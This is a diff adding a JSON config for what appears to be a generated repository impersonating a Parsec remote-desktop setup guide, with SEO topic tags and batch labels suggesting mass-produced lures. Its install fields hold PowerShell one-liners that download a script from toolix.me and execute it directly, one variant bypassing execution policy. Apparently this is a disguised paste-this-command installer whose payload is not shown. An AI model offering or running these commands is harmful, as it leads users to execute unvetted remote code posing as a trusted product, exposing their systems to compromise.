@@ -1,0 +1,27 @@
+{
+  "repo": "parsec-business-remote-desktop-suite-business-desktop-setup-guide",
+  "product": "Parsec Business Remote Desktop Suite Business Desktop Setup Guide",
+  "product_title": "parsec",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-part1",
+  "format": "license-md-toolix-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "parsec-business-remote",
+    "parsec-remote",
+    "remote-desktop",
+    "low-latency-remote",
+    "screen-sharing",
+    "game-streaming",
+    "how-to-install-parsec-remote",
+    "how-to-setup-parsec-remote",
+    "desktop-package",
+    "windows-11",
+    "windows-remote"
+  ],
+  "site": "toolix.me"
+}
